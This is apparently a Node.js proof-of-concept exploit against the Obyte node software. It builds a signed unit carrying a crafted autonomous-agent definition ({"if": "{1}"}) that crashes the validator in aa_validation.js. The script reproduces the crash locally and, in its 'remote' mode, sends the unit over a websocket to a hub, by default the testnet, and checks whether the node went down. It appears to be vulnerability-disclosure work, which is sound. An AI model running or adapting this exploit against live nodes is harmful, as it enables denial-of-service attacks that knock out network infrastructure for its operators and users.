'use strict';
const crypto = require('crypto');
const _ = require('lodash');
const async = require('async');
const ecdsa = require('secp256k1');
const base32 = require('thirty-two');

// protocol helpers: string_utils.js, chash.js, object_hash.js, object_length.js

function toJsonStr(obj) {
	return JSON.stringify(obj).replace(/[\ud800-\udfff]/g, c => "\\u" + c.codePointAt(0).toString(16));
}

function getJsonSourceString(obj) {
	let cache = new WeakMap();
	function s(v) {
		if (v === null) throw Error("null value");
		switch (typeof v) {
			case "string": return toJsonStr(v);
			case "number":
			case "boolean": return v.toString();
			case "object":
				if (cache.has(v)) return cache.get(v);
				let r;
				if (Array.isArray(v))
					r = '[' + v.map(s).join(',') + ']';
				else {
					let keys = Object.keys(v).sort();
					r = '{' + keys.map(k => toJsonStr(k) + ':' + s(v[k])).join(',') + '}';
				}
				cache.set(v, r);
				return r;
		}
	}
	return s(obj);
}

var SEP = "\x00";
function getSourceString(obj) {
	var c = [];
	function e(v) {
		if (v === null) throw Error("null value");
		switch (typeof v) {
			case "string": c.push("s", v); break;
			case "number": c.push("n", v.toString()); break;
			case "boolean": c.push("b", v.toString()); break;
			case "object":
				if (Array.isArray(v)) { c.push('['); v.forEach(e); c.push(']'); }
				else { Object.keys(v).sort().forEach(k => { c.push(k); e(v[k]); }); }
				break;
		}
	}
	e(obj);
	return c.join(SEP);
}

// chash160 address derivation
var offsets160 = (function () {
	var pi = "14159265358979323846264338327950288419716939937510".split("");
	var arr = [], off = 0;
	for (var i = 0; off < 160; i++) {
		var r = parseInt(pi[i]);
		if (!r) continue;
		off += r;
		if (off >= 160) break;
		arr.push(off);
	}
	return arr;
})();

function buf2bin(buf) {
	return Array.from(buf, b => b.toString(2).padStart(8, '0')).join('');
}

function bin2buf(bin) {
	var buf = Buffer.alloc(bin.length / 8);
	for (var i = 0; i < buf.length; i++) buf[i] = parseInt(bin.substr(i * 8, 8), 2);
	return buf;
}

function getChash160(data) {
	var hash = crypto.createHash("ripemd160").update(data, "utf8").digest().slice(4);
	var cs = crypto.createHash("sha256").update(hash).digest();
	var checksum = Buffer.from([cs[5], cs[13], cs[21], cs[29]]);
	var bd = buf2bin(hash), bc = buf2bin(checksum).split('');
	var frags = [], start = 0;
	for (var i = 0; i < offsets160.length; i++) {
		frags.push(bd.substring(start, offsets160[i] - i), bc[i]);
		start = offsets160[i] - i;
	}
	if (start < bd.length) frags.push(bd.substring(start));
	return base32.encode(bin2buf(frags.join(''))).toString();
}

function objChash160(obj) {
	var src = (Array.isArray(obj) && obj.length === 2 && obj[0] === 'autonomous agent')
		? getJsonSourceString(obj) : getSourceString(obj);
	return getChash160(src);
}

function b64Hash(obj, json) {
	var src = json ? getJsonSourceString(obj) : getSourceString(obj);
	return crypto.createHash("sha256").update(src, "utf8").digest("base64");
}

function getNaked(u) {
	var n = _.cloneDeep(u);
	['unit','headers_commission','payload_commission','oversize_fee','actual_tps_fee','main_chain_index'].forEach(k => delete n[k]);
	if (n.messages) n.messages.forEach(m => { delete m.payload; delete m.payload_uri; });
	return n;
}

function getStripped(u) {
	return {
		content_hash: b64Hash(getNaked(u), true),
		version: u.version, alt: u.alt, timestamp: u.timestamp,
		authors: u.authors.map(a => ({ address: a.address })),
		...(u.witness_list_unit ? { witness_list_unit: u.witness_list_unit } : { witnesses: u.witnesses }),
		...(u.parent_units ? { parent_units: u.parent_units, last_ball: u.last_ball, last_ball_unit: u.last_ball_unit } : {})
	};
}

function unitHash(u) { return b64Hash(getStripped(u), true); }

function hashToSign(u) {
	var n = getNaked(u);
	n.authors.forEach(a => delete a.authentifiers);
	return crypto.createHash("sha256").update(getJsonSourceString(n), "utf8").digest();
}

// object_length: commission computation
function objLen(v, wk) {
	let cache = new WeakMap();
	function l(v) {
		if (v === null) return 0;
		switch (typeof v) {
			case "string": return v.length;
			case "number": return 8;
			case "boolean": return 1;
			case "object":
				if (cache.has(v)) return cache.get(v);
				var n = 0;
				if (Array.isArray(v)) v.forEach(e => n += l(e));
				else for (var k in v) { if (wk) n += k.length; n += l(v[k]); }
				cache.set(v, n);
				return n;
		}
	}
	return l(v);
}

function headersSize(u) {
	var h = _.cloneDeep(u);
	['unit','headers_commission','payload_commission','oversize_fee','actual_tps_fee','main_chain_index','messages','parent_units'].forEach(k => delete h[k]);
	return objLen(h, true) + 88 + 12; // PARENT_UNITS_SIZE=88, PARENT_UNITS_KEY_SIZE=12
}

function payloadSize(u) { return objLen({ messages: u.messages }, true); }

// keypair and signing
function keygen() {
	let pk; do { pk = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(pk));
	return { priv: pk, pub64: Buffer.from(ecdsa.publicKeyCreate(pk)).toString('base64') };
}

function sign(u, pk) {
	return Buffer.from(ecdsa.ecdsaSign(hashToSign(u), pk).signature).toString('base64');
}

// the AA definition that triggers the crash
function maliciousDef() {
	return ["autonomous agent", {
		bounce_fees: { base: 10000 },
		messages: [{ app: "data", payload: { x: { "if": "{1}" } } }]
	}];
}

// -- test: local crash reproduction --
// replicates validate() from aa_validation.js lines 573-685
function testLocal() {
	var isObj = o => typeof o === 'object' && !Array.isArray(o) && o !== null && Object.keys(o).length > 0;
	var getF = s => typeof s === 'string' && s.match(/^\{(.+)\}$/s) ? s.match(/^\{(.+)\}$/s)[1] : null;
	var hasC = v => typeof v === 'object' && v !== null && !Array.isArray(v) && Array.isArray(v.cases);
	var vf = (_, cb) => cb(); // formula validator mock (irrelevant to crash path)

	function validate(obj, name, path, loc, depth, cb, vo) {
		if (depth > 100) return cb("max depth");
		loc = _.cloneDeep(loc);
		var val = obj[name];
		if (typeof name === 'string' && !vo) {
			if (getF(name) !== null)
				return vf({ f: getF(name) }, err => err ? cb(err) : validate(obj, name, path, loc, depth, cb, true));
		}
		if (typeof val === 'number' || typeof val === 'boolean') return cb();
		if (typeof val === 'string') {
			if (getF(val) === null) return cb();
			return vf({ f: getF(val) }, cb);
		}
		if (hasC(val)) {
			if (typeof name === 'string') path = path.substring(0, path.length - name.length - 1);
			return async.eachOfSeries(val.cases, (c, i, cb2) => {
				if (typeof c[name] === 'undefined') return cb2('no field ' + name);
				validate(val.cases, i, path, _.cloneDeep(loc), depth + 1, cb2);
			}, cb);
		}
		if (typeof val === 'object' && (typeof val.if === 'string' || typeof val.init === 'string')) {
			var doIf = cb2 => typeof val.if !== 'string' ? cb2() : getF(val.if) === null ? cb2("not formula") : vf({}, cb2);
			var doInit = cb2 => typeof val.init !== 'string' ? cb2() : getF(val.init) === null ? cb2("not formula") : vf({}, cb2);
			return doIf(err => err ? cb(err) : doInit(err => {
				if (err) return cb(err);
				delete val.if; delete val.init;
				validate(obj, name, path, loc, depth, cb); // re-enters with {} -> crash
			}));
		}
		if (Array.isArray(val))
			return async.eachOfSeries(val, (e, i, cb2) => validate(val, i, path, _.cloneDeep(loc), depth + 1, cb2), cb);
		if (isObj(val))
			return async.eachSeries(Object.keys(val), (k, cb2) => validate(val, k, path + '/' + k, _.cloneDeep(loc), depth + 1, cb2), cb);
		throw Error('unknown type of value in ' + name);
	}

	var caught = false;
	try { validate(_.cloneDeep(maliciousDef()), 1, '', {}, 0, () => {}); }
	catch (e) { caught = true; console.log('[PASS] ' + e.message); }

	if (!caught) {
		process.once('uncaughtException', e => { console.log('[PASS] ' + e.message); process.exit(0); });
		setTimeout(() => { console.log('[FAIL] no crash'); process.exit(1); }, 3000);
	}
}

// -- test: hash/sign/commission verification --
function testVerify() {
	var def = maliciousDef();
	var aa = objChash160(def);
	var payload = { address: aa, definition: def };
	var ph = b64Hash(payload, true);
	var kp = keygen();
	var addr = objChash160(["sig", { pubkey: kp.pub64 }]);

	var u = {
		version: '4.0t', alt: '2', timestamp: Math.round(Date.now() / 1000),
		parent_units: ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='],
		last_ball: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=',
		last_ball_unit: 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=',
		witness_list_unit: 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=',
		authors: [{ address: addr, definition: ["sig", { pubkey: kp.pub64 }], authentifiers: {} }],
		messages: [{ app: 'definition', payload_hash: ph, payload: payload }]
	};
	u.authors[0].authentifiers = { r: sign(u, kp.priv) };
	u.headers_commission = headersSize(u);
	u.payload_commission = payloadSize(u);
	u.unit = unitHash(u);

	var ok = aa.length === 32 && ph.length === 44 && addr.length === 32 && u.unit.length === 44;
	console.log(ok ? '[PASS] unit=' + u.unit : '[FAIL] hash mismatch');
}

// -- test: network delivery to testnet hub --
function testRemote(hub) {
	var WebSocket = require('ws');
	var opts = {};
	try {
		var { HttpsProxyAgent } = require('https-proxy-agent');
		if (process.env.HTTPS_PROXY) opts.agent = new HttpsProxyAgent(process.env.HTTPS_PROXY);
	} catch (e) {}

	var ws = new WebSocket(hub, opts);
	var tags = {}, tid = 0;

	function req(cmd, par) {
		return new Promise((res, rej) => {
			var t = 't' + (tid++);
			tags[t] = res;
			ws.send(JSON.stringify(['request', { command: cmd, params: par, tag: t }]));
			setTimeout(() => { if (tags[t]) { delete tags[t]; rej(Error('timeout: ' + cmd)); } }, 15000);
		});
	}

	ws.on('message', d => {
		var m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
		if (m[0] === 'response' && m[1] && tags[m[1].tag]) {
			tags[m[1].tag](m[1]);
			delete tags[m[1].tag];
		}
	});
	ws.on('error', e => console.log('[FAIL] ' + e.message));
	ws.on('close', () => {});

	ws.on('open', () => {
		(async () => {
			// fetch network state
			var w = ((await req('get_witnesses')).response);
			if (!Array.isArray(w) || !w.length) throw Error('no witnesses');

			var sp = (await req('get_last_stable_unit_props')).response;
			if (!sp || !sp.unit) throw Error('no stable unit');

			var j = (await req('get_joint', sp.unit)).response;
			var joint = j.joint;
			if (!joint || !joint.unit) throw Error('no joint');

			var ref = joint.unit;
			var parent = ref.unit;
			var ball = joint.ball || ref.last_ball;
			var ballUnit = joint.ball ? parent : ref.last_ball_unit;

			// derive version/alt from the network's own units
			var ver = ref.version || '4.0';
			var alt = ref.alt || '1';

			// build malicious unit
			var kp = keygen();
			var authDef = ["sig", { pubkey: kp.pub64 }];
			var authAddr = objChash160(authDef);
			var aaDef = maliciousDef();
			var aaAddr = objChash160(aaDef);
			var payload = { address: aaAddr, definition: aaDef };

			var u = {
				version: ver, alt: alt, timestamp: Math.round(Date.now() / 1000),
				parent_units: [parent].sort(),
				last_ball: ball, last_ball_unit: ballUnit,
				authors: [{ address: authAddr, definition: authDef, authentifiers: {} }],
				messages: [{ app: 'definition', payload_hash: b64Hash(payload, true), payload: payload }],
			};
			if (ref.witness_list_unit) u.witness_list_unit = ref.witness_list_unit;
			else u.witnesses = w;

			u.authors[0].authentifiers = { r: sign(u, kp.priv) };
			u.headers_commission = headersSize(u);
			u.payload_commission = payloadSize(u);
			u.unit = unitHash(u);

			// send joint
			ws.send(JSON.stringify(['justsaying', { subject: 'joint', body: { unit: u } }]));

			// collect response
			var done = false;
			ws.on('message', d => {
				if (done) return;
				var m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
				if (m[0] === 'justsaying' && m[1] && ['error','result','info'].includes(m[1].subject)) {
					done = true;
					console.log('[RESULT] ' + JSON.stringify(m[1].body));
				}
			});
			setTimeout(() => { if (!done) console.log('[INFO] no response (node may have crashed)'); ws.close(); }, 10000);
		})().catch(e => { console.log('[FAIL] ' + e.message); ws.close(); });
	});
}

var mode = process.argv[2] || 'local';
var hub = process.argv[3] || 'wss://obyte.org/bb-test';

switch (mode) {
	case 'local': testLocal(); break;
	case 'verify': testVerify(); break;
	case 'remote': testRemote(hub); break;
	default: console.log('usage: node poc.js [local|verify|remote] [hub_url]');
}
